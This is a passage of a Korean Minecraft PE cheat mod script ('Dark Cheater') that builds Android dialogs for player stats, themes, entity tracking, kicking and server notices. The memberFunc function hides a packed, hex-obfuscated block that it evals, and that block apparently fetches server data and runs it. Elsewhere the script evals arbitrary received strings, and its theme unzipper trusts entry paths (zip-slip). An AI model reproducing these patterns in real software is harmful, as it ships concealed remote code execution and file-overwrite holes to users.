layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout),
dialog.setView(scroll);
dialog.setTitle("이동 금지 대상자 목록");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function playerHunger(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var value = Player.getHunger();
var txt = new android.widget.TextView(ctx);
txt.setText("허기 : "+Player.getHunger());
txt.setTextSize(16);
txt.setTextColor(white);
layout.addView(txt);
var hh = new android.widget.SeekBar(ctx);
hh.setMax(20);
hh.setProgress(Player.getHunger());
hh.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener({
onProgressChanged : function(seek){
value = seek.getProgress();
txt.setText("허기 : "+value);
}
}));
layout.addView(hh);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("허기 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
Player.setHunger(value);
Dark.toast("허기가 설정되었습니다.");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function inputMaxHealth(target){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loc2 = new android.widget.EditText(ctx);
loc2.setHint("최대 체력을 입력하세요...");
loc2.setInputType(number|number2);
layout.addView(loc2);
Dark.noFullScreen(loc2);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("최대 체력 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
if(target!=null){
for each(var pp in target)
Entity.setMaxHealth(pp, loc2.getText());
}
else{
Entity.setMaxHealth(playerTarget, loc2.getText());
Dark.toast("최대 체력이 "+loc2.getText()+"(으)로 설정되었습니다.");
}
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function themeList(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var dir = new java.io.File(sdcard+"/darkTornado/darkCheater/themes/").list().sort();
var dir2 = [];
for each(var f in dir){
var ff = new java.io.File(sdcard+"/darkTornado/darkCheater/themes/"+f);
if(ff.isDirectory()) dir2.push(f);
}
dialog.setItems(dir2, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
selectThemeAct(dir2[w]);
}
}));
dialog.setTitle("다크 치터 테마 관리 ("+dir2.length+"개)");
dialog.setNegativeButton("닫기", null);
dialog.setNeutralButton("다운로드", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
selectDownloadType();
Dark.toast("작업을 선택하세요.");
}
}));
dialog.setPositiveButton("불러오기", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
importTheme(sdcard);
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function selectThemeAct(themeName){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var acts = ["테마 사용", "테마 삭제", "테마 정보"];
dialog.setItems(acts, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
switch(w){
case 0 : 
Dark.save("themeName", themeName);
Dark.toast("테마가 "+themeName+"(으)로 설정되었습니다.");
btnBackData = null;
titleBackData = null;
break;
case 1 : 
var folder = new java.io.File(sdcard+"/darkTornado/darkCheater/themes/"+themeName+"/");
Utils.clearDirectory(folder);
if(folder.exists()) folder.delete();
Dark.toast("테마가 삭제되었습니다.");
break;
case 2 : 
Dark.showDialog("테마 정보 보기", "테마 이름 : "+themeName+"\n제작자 : "+Dark.getThemeInfo(themeName)+"\n경로 : "+sdcard+"/darkTornado/darkCheater/themes/"+themeName+"/");
break;
}
}
}));
dialog.setTitle("다크 치터 테마 관리 - 작업 선택");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function importTheme(path){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var dir = new java.io.File(path).list().sort();
var dir2 = [];
var dir3 = [];
for each(var f in dir){
if(f.substring(0, 1)!="."){
var ff = new java.io.File(path+"/"+f);
var fff = f.split("\\.");
if(ff.isDirectory()) dir2.push(f);
else if(fff[fff.length-1]=="zip") dir3.push(f);
}
}
dir2.sort();
dir3.sort();
for each(var f in dir3) dir2.push(f);
dialog.setItems(dir2, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
var file = new java.io.File(path+"/"+dir2[w]);
if(file.isDirectory()) importTheme(path+"/"+dir2[w]);
else unZipTheme(path+"/"+dir2[w], dir2[w].toString());
}
}));
dialog.setTitle("테마 불러오기");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function unZipTheme(zip, name){
try{
var path = sdcard+"/darkTornado/darkCheater/themes/"+name.substring(0, name.lastIndexOf("."));
var folder = new java.io.File(path);
folder.mkdir();
var fis = new java.io.FileInputStream(zip);
var zis = new java.util.zip.ZipInputStream(fis);
var entry;
while((entry = zis.getNextEntry())!=null){
var fos = new java.io.FileOutputStream(path+"/"+entry.getName());
var buf = new java.nio.ByteBuffer.allocate(1024).array();
var len;
while((len = zis.read(buf))>0){
fos.write(buf, 0, len);
}
zis.closeEntry();
fos.close();
}
zis.close();
Dark.toast("테마를 불러왔습니다.\n   (테마명 : "+name.substring(0, name.lastIndexOf("."))+")");
}
catch(e){
Dark.showError(e);
}
}


function selectDownloadType(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var acts = ["다크 치터 기본 제공 테마", "사용자 제작 테마", "테마 다운로드 홈페이지"];
dialog.setItems(acts, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
if(checkInternet()){
switch(w){
case 0 : 
downloadTheme();
break;
case 1 : 
Dark.toast("테마 목록을 불러오고 있습니다.");
new java.lang.Thread({
run : function(){
java.lang.Thread.sleep(100);
var themes = Dark.getDataFromServer(GitHubLink+"customThemeData.txt");
customTheme(themes);
}
}).start();
break;
case 2 : 
var uri = new android.net.Uri.parse("http://darktornado.dothome.co.kr/darkCheater/theme.html");
var link = new android.content.Intent(android.content.Intent.ACTION_VIEW, uri);
ctx.startActivity(link);
break;
}
}
}
}));
dialog.setTitle("다크 치터 테마 관리 - 테마 다운로드");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function downloadTheme(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var themes = ["Cytus", "Deemo", "MCPE GUI", "Simple", "시노부", "시로", "이리야", "진격의 거인", "치노", "카나데"];
var urls = ["tc1kke4pu0utyxv/Cytus", "prsp4ohfxk9p6st/Deemo", "vo01s0vfs885ob7/MCPE%20GUI", "gd3qqip2chvxj6y/Simple", "ly4e644n8kjmlm8/%EC%8B%9C%EB%85%B8%EB%B6%80", "9pmonw61vfag5i6/%EC%8B%9C%EB%A1%9C", "ynrejbx9m9oqs8t/%EC%9D%B4%EB%A6%AC%EC%95%BC", "lmh7po7h7mb4707/%EC%A7%84%EA%B2%A9%EC%9D%98%20%EA%B1%B0%EC%9D%B8", "hd77t15akdwgvus/%EC%B9%98%EB%85%B8", "0zpe7chrulatzb6/%EC%B9%B4%EB%82%98%EB%8D%B0"];
dialog.setItems(themes, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
download("Download", themes[w]+".zip", "다크 치터 테마 다운로드 ("+themes[w]+")", "https://www.dropbox.com/s/"+urls[w]+".zip?dl=1", 1);
}
}));
dialog.setTitle("다크 치터 테마 다운로드");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function download(path, file, title, url, hide){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
if(checkInternet()){
var uri = new android.net.Uri.parse(url);
var dm = new android.app.DownloadManager.Request(uri);
dm.setTitle(title);
dm.setDescription("파일 다운로드 중...");
dm.setDestinationInExternalPublicDir(path, file);
dm.setNotificationVisibility(hide);
ctx.getSystemService(android.content.Context.DOWNLOAD_SERVICE).enqueue(dm);
Dark.toast("파일 다운로드를 시작합니다.\n   (폴더 : "+sdcard+"/"+path+", 파일 : "+file+")");
}
else{
Dark.toast("인터넷에 연결되어있지 않습니다.");
}
}
catch(e){
Dark.toast("다운로드 실패. 오류 : "+e);
}
}
}));
}


function lightningPower(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var value = lp;
var txt = new android.widget.TextView(ctx);
txt.setText("폭발력 : "+value);
txt.setTextSize(16);
txt.setTextColor(white);
layout.addView(txt);
var hh = new android.widget.SeekBar(ctx);
hh.setMax(10);
hh.setProgress(value);
hh.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener({
onProgressChanged : function(seek){
value = seek.getProgress();
txt.setText("폭발력 : "+value);
}
}));
layout.addView(hh);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("번개 폭발력 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
lp = value;
if(lp==0) Dark.toast("비활성화되었습니다.");
else Dark.toast("설정되었습니다.");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function memberFunc(){
var code = function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('V 9="\\19\\M\\e\\16\\18\\C\\1b\\H\\e\\I\\C\\e\\J\\r\\O\\P\\e\\T\\v\\r\\i\\a\\8\\b\\d\\l\\8\\a\\l\\8\\d\\c\\8\\a\\L\\8\\8\\D\\l\\N\\f\\f\\k\\k\\k\\i\\w\\c\\b\\D\\x\\b\\y\\i\\s\\b\\p\\f\\l\\f\\1a\\8\\F\\b\\t\\h\\c\\s\\u\\K\\G\\j\\o\\k\\u\\f\\p\\g\\p\\x\\g\\c\\z\\Q\\o\\s\\i\\8\\y\\8\\R\\w\\h\\S\\t\\a\\j\\g\\8\\A\\d\\8\\d\\z\\c\\b\\p\\U\\g\\c\\F\\g\\c\\a\\h\\d\\o\\j\\a\\h\\b\\j\\B\\o\\A\\B\\d\\h\\b\\j\\a\\W\\X\\Y\\e\\Z\\10\\11\\12\\e\\13\\14\\v\\r\\i".15("\\a");q(17){q(m==E){n[9[1]](9[0])};1c 1d[9[5]].1e({1f:1g(){q(m==E){m=n[9[4]](9[3])};1h(m)}})[9[2]]()}1i{n[9[6]]();n[9[1]](9[7])}',62,81,'||||||||x74|_0x5a63|xXZ|x6F|x72|x61|x20|x2F|x65|x6C|x2E|x67|x77|x73|loginCache|Dark|x6E|x6D|if|uB2E4|x63|x31|x30|uB2C8|x64|x62|x78|x46|x44|x69|uC2DC|x70|null|x76|x6B|uB294|uC7A0|uAE30|x38|x68|uCD08|x3A|uB824|uC57C|x75|x3F|x3D|uD569|x53|var|uB85C|uADF8|uC778|uB418|uC5B4|uC788|uC9C0|uC54A|uC2B5|split|uC2E4|isLogined|uD589|uCD5C|x37|uC5D0|new|java|Thread|run|function|eval|else'.split('|'),0,{});
eval(code);
}


function entitySearch(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var txt1 = new android.widget.TextView(ctx);
txt1.setText("엔티티 타입 아이디");
txt1.setTextSize(18);
txt1.setTextColor(white);
var txt2 = new android.widget.EditText(ctx);
txt2.setHint("엔티티 타입 아이디를 입력하세요(생략시 모든 엔티티)...");
txt2.setTextColor(white);
txt2.setInputType(number);
var txt3 = new android.widget.TextView(ctx);
txt3.setText("범위");
txt3.setTextSize(18);
txt3.setTextColor(white);
var txt4 = new android.widget.EditText(ctx);
txt4.setHint("반경(범위)을 입력하세요(생략시 무제한)...");
txt4.setTextColor(white);
txt4.setInputType(number);
layout.addView(txt1);
layout.addView(txt2);
layout.addView(txt3);
layout.addView(txt4);
Dark.noFullScreen(txt2);
Dark.noFullScreen(txt4);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("엔티티 추적");
dialog.setNegativeButton("닫기", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
var r = Number(txt4.getText());
var target = null;
var targetDis = 500;
var dis = 0;
for each(var e in Entity.getAll()){
px = Math.abs(Entity.getX(ad)-Entity.getX(e));
py = Math.abs(Entity.getY(ad)-Entity.getY(e));
pz = Math.abs(Entity.getZ(ad)-Entity.getZ(e));
if(((px<=r&&py<=r&&pz<=r)||txt4.getText().toString()=="")&&ad!=e){
if(txt2.getText().toString()==""||Entity.getEntityTypeId(e)==txt2.getText()){
dis = Math.sqrt(Math.pow(px, 2)+Math.pow(py, 2)+Math.pow(pz, 2));
if(dis<targetDis){
target = e;
targetDis = dis;
}
}
}
}
if(target==null){
Dark.toast("엔티티를 찾을 수 없습니다.");
}
else{
var names = [];
var entityIds = [];
for(var n=0;entityData[n][1]<64;n++){
names[n] = entityData[n][0];
entityIds[n] = entityData[n][1];
}
searchTarget = target;
if(Player.isPlayer(target)){
searchTargetData = Player.getName(target);
}
else{
Entity.setNameTag(searchTarget, "§c[Target]");
searchTargetData = names[entityIds.indexOf(Entity.getEntityTypeId(target))];
}
}
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function makeBatteryNotifier(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
if(tf){
bBtn = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var txt = new android.widget.TextView(ctx)
txt.setText(Dark.getBatteryLevel()+"%");
txt.setTextSize(16);
txt.setTextColor(white);
txt.setGravity(center);
txt.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
Dark.toast("베터리 온도 : "+Dark.getBatteryTemp());
}
});
setDragListener(bBtn, txt, 1);
layout.addView(txt);
var pad = dip2px(ctx, 3);
layout.setPadding(pad, pad, pad, pad);
bBtn.setContentView(layout);
bBtn.setWidth(-2);
bBtn.setHeight(-2);
bBtn.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(150, 80, 80, 80)));
bBtn.showAtLocation(ctx.getWindow().getDecorView(), center|android.view.Gravity.TOP, -dip2px(ctx, 70), 0);
new java.lang.Thread({
run : function(){
while(bBtn!=null){
java.lang.Thread.sleep(5000);
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
txt.setText(Dark.getBatteryLevel()+"%");
}
}));
}
}
}).start();
}
else{
if(bBtn!=null){
bBtn.dismiss();
bBtn = null;
}
}
}
catch(e){
Dark.showError(e);
}
}
}));
}


function kickDialog(pn, pe, str){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
dialog.setTitle("플레이어 자동 강퇴");
dialog.setMessage(pn+"(이)가 인첸트된 아이템을 사용하여 자동으로 강퇴되었습니다.\n블록런처 종료 시점까지 접속을 차단하시겠습니까?\n\n<사용한 아이템 정보>\n"+str);
dialog.setNegativeButton("아니요", null);
dialog.setPositiveButton("네", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
kickArray.push([pn, pe]);
Dark.toast("블록런처 종료 시점까지 "+pn+"의 접속을 차단합니다.");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function antiPotion(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var names = ["포화", "흡수", "체력 신장", "위더", "독", "나약함", "허기", "야간투시", "실명", "투명화", "수중 호흡", "화염저항", "저항", "재생", "멀미", "점프 강화", "즉시 데미지", "즉시 회복", "힘", "피로", "성급함", "구속", "신속"];
var types = [MobEffect.saturation, MobEffect.absorption, MobEffect.healthBoost, MobEffect.wither, MobEffect.poison, MobEffect.weakness, MobEffect.hunger, MobEffect.nightVision, MobEffect.blindness, MobEffect.invisibility, MobEffect.waterBreathing, MobEffect.fireResistance, MobEffect.damageResistance, MobEffect.regeneration, MobEffect.confusion, MobEffect.jump, MobEffect.harm, MobEffect.heal, MobEffect.damageBoost, MobEffect.digSlowdown, MobEffect.digSpeed, MobEffect.movementSlowdown, MobEffect.movementSpeed];
var typeId = [];
var checks = [];
for(var n in names){
checks[n] = new android.widget.CheckBox(ctx);
checks[n].setText(names[n]);
checks[n].setId(n);
checks[n].setTextColor(white);
if(antiPotionData.indexOf(types[n])!=-1) checks[n].setChecked(true);
else checks[n].setChecked(false);
checks[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
if(onoff==true){
antiPotionData.push(types[check.getId()]);
}
else if(onoff==false){
antiPotionData.splice(antiPotionData.indexOf(types[check.getId()]), 1);
}
}
}));
layout.addView(checks[n]);
}
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("포션 효과 방지");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function buttonRevival(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function() {
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loc2 = new android.widget.EditText(ctx);
loc2.setHint("비밀 번호를 입력하세요...");
loc2.setInputType(number);
layout.addView(loc2);
Dark.noFullScreen(loc2);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("비밀번호 입력");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
if(loc2.getText().toString()==""){
Dark.save("info6", true);
Dark.toast("버튼이 유지되기 시작합니다.");
}
else{
Dark.toast("비밀번호가 다릅니다.");
}
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function customTheme(themeData){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var themes = [];
var data = themeData.split("\n");
for(var n in data){
var d2 = data[n].split("::");
themes[n] = d2[0]+" (by"+d2[1]+")";
}
dialog.setItems(themes, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
var d2 = data[w].split("::");
download("Download", d2[0]+".zip", "다크 치터 테마 다운로드 ("+d2[0]+")", "https://www.dropbox.com/s/"+d2[2]+".zip?dl=1", 1);
}
}));
dialog.setTitle("다크 치터 테마 다운로드");
dialog.setNegativeButton("취소", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function receiveDataFromNusty(func){
try{
if(typeof func=="function") func();
else eval(func+"");
}
catch(e){
Dark.showError(e);
}
}


function receiveAutoLink(linkType){
linkArray[linkType] = true;
}


function openClientIdWhiteList(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var list = new android.widget.EditText(ctx);
list.setHint("닉네임을 입력하세요...");
list.setText(ciwl.data);
list.setTextColor(white);
layout.addView(list);
Dark.noFullScreen(list);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var pl = new android.widget.Button(ctx);
pl.setText("접속중인 플레이어 목록에서 불러오기");
pl.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
playerList(list, true);
}
});
layout.addView(pl);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("C.I.W.L 목록");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("저장", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
ciwl.data = list.getText().toString();
if(list.getText()==""){
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/whiteListData/"+Level.getWorldDir()+"+.txt");
if(file.exists()) file.delete();
}
else{
Dark.save("whiteListData/"+Level.getWorldDir(), ciwl.data);
}
Dark.toast("저장되었습니다.");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function playerAddedHandler(p){
var isLeft = false;
if(leftPls[0]!=null){
for(var n=0;n<leftPls.length;n++){
if(leftPls[n]==p){
ScriptManager.callScriptMethod("entityAddedHook", [new java.lang.Long(p)]);
ScriptManager.allplayers.add(new java.lang.Long(p));
isLeft = true;
Dark.toast("들어온 플레이어를 인식하였습니다.\n닉네임 : "+Player.getName(p)+", Client Id : "+p);
leftPls.splice(n, 1);
}
}
}
if(!isLeft){
var add = true;
var ents = ScriptManager.allentities;
for(var n=0;n<ents.size();n++){
if(ents.get(n)==p){
add = false;
break;
}
}
if(add){
ScriptManager.entityAddedCallback(java.lang.Long(p));
Dark.toast("새로운 플레이어를 인식하였습니다.\n닉네임 : "+Player.getName(p)+", Client Id : "+p);
}
}

}


function inputTerrorlistName(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
loc1.setText("테러범 닉네임 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("테러범의 닉네임을 입력하세요...");
loc2.setTextColor(white);
loc3.setText("신고 사유 : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("신고 사유를 입력하세요...");
loc4.setTextColor(white);
layout.addView(loc1);
layout.addView(loc2);
layout.addView(loc3);
layout.addView(loc4);
Dark.noFullScreen(loc2);
Dark.noFullScreen(loc4);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("테러범 신고");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
Dark.sendDataToServer("테러범 신고", "테러범 이름 : "+loc2.getText()+"\n신고 사유 : "+loc4.getText()+"\n신고한 사람 : "+ModPE.getUserName());
Dark.showDialog("테러범 신고 완료", "신고가 접수되었습니다.\n제작자가 확인할 시, 테러범 목록에 뜨며, 해당 테러범이 사칭을 한 것인 경우, 허위 신고 등의 경우에는 목록에 뜨지 않습니다.");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function openNotice(value){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var str = value.split("\n\n----------\n");
var title = [], msg = [], index = [];
for(var n in str){
var str2 = String(str[n]).split(">\n\n");
title[n] = (Number(n)+1)+". "+str2[0].substring(1, str2[0].length);
msg[n] = str2[1];
index[n] = Number(n)+1;
}
title.reverse();
msg.reverse();
index.reverse();
dialog.setItems(title, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
Dark.showDialog(title[w], msg[w]);
if(Number(index[w])>Number(Dark.read("notice"))) Dark.save("notice", index[w]);
}
}));
dialog.setTitle("Dark Cheater 공지 사항 게시판");
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function showNotice(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setOrientation(1);
var n1 = 0, n2 = 0, n3 = 0;
var types1 = ["말머리 선택", "<공지>", "[공지]", "사용 안함"];
var types2 = ["내용 색상 선택", "검정", "어두운 파랑", "어두운 초록", "어두운 하늘색", "어두운 빨강", "어두운 보라색", "금색", "회색", "어두운 회색", "파랑", "초록", "하늘색", "빨강", "밝은 보라", "노랑", "흰색"];
var types2_Data = ["f", 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, "a", "b", "c", "d", "e", "f"];
var types3 = ["말머리 색상 선택", "검정", "어두운 파랑", "어두운 초록", "어두운 하늘색", "어두운 빨강", "어두운 보라색", "금색", "회색", "어두운 회색", "파랑", "초록", "하늘색", "빨강", "밝은 보라", "노랑", "흰색"];
var spin1 = new android.widget.Spinner(ctx);
var adapter1 = new android.widget.ArrayAdapter(ctx, android.R.layout.simple_list_item_1, types1);
spin1.setAdapter(adapter1);
spin1.setOnItemSelectedListener(new android.widget.AdapterView.OnItemSelectedListener({
onItemSelected : function(parent, v, p) {
n1 = p;
try{
if(p==1||p==2) layout2.addView(spin3);
else layout2.removeView(spin3);
}
catch(e){
//오류는 가볍게 무시
}
}
}));
layout.addView(spin1);
layout.addView(layout2);
var spin2 = new android.widget.Spinner(ctx);
var adapter2 = new android.widget.ArrayAdapter(ctx, android.R.layout.simple_list_item_1, types2);
spin2.setAdapter(adapter2);
spin2.setOnItemSelectedListener(new android.widget.AdapterView.OnItemSelectedListener({
onItemSelected : function(parent, v, p) {
n2 = p;
}
}));
layout.addView(spin2);
var spin3 = new android.widget.Spinner(ctx);
var adapter3 = new android.widget.ArrayAdapter(ctx, android.R.layout.simple_list_item_1, types3);
spin3.setAdapter(adapter3);
spin3.setOnItemSelectedListener(new android.widget.AdapterView.OnItemSelectedListener({
onItemSelected : function(parent, v, p) {
n3 = p;
}
}));
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("내용 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("공지의 내용을 입력하세요...");
loc2.setTextColor(white);
layout.addView(loc1);
layout.addView(loc2);
Dark.noFullScreen(loc2);
if(tf){
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
loc3.setText("주기(초) : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("주기를 입력하세요...(0이나 미입력시 정지)");
loc4.setTextColor(white);
layout.addView(loc3);
layout.addView(loc4);
Dark.noFullScreen(loc4);
}
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
if(tf){
if(loc4.getText().toString()==""||loc4.getText().toString()=="0"){
noticeStop = true;
Dark.toast("공지 띄우기를 정지합니다.");
}
else{
if(n1==1) var str = "§"+types2_Data[n3]+"<공지> §"+types2_Data[n2]+loc2.getText();
else if(n1==2) var str = "§"+types2_Data[n3]+"[공지] §"+types2_Data[n2]+loc2.getText();
else var str = "§"+types2_Data[n2]+loc2.getText();
var delay = Number(loc4.getText())*1000;
noticeStop = false;
new java.lang.Thread({
run : function(){
while(true){
sendMessage(str);
java.lang.Thread.sleep(delay);
if(noticeStop) break;
}
}
}).start();
Dark.toast("공지를 띄우기 시작합니다.");
}
}
else{
if(n1==1) sendMessage("§"+types2_Data[n3]+"<공지> §"+types2_Data[n2]+loc2.getText());
else if(n1==2) sendMessage("§"+types2_Data[n3]+"[공지] §"+types2_Data[n2]+loc2.getText());
else sendMessage("§"+types2_Data[n2]+loc2.getText());
Dark.toast("공지를 띄웠습니다.");
}
}
}));
if(tf) dialog.setTitle("공지 띄우기 (계속)");
else dialog.setTitle("공지 띄우기 (1회)");
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function sendMsg(target){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var nn = 0;
var types = ["내용 색상 선택", "검정", "어두운 파랑", "어두운 초록", "어두운 하늘색", "어두운 빨강", "어두운 보라색", "금색", "회색", "어두운 회색", "파랑", "초록", "하늘색", "빨강", "밝은 보라", "노랑", "흰색"];
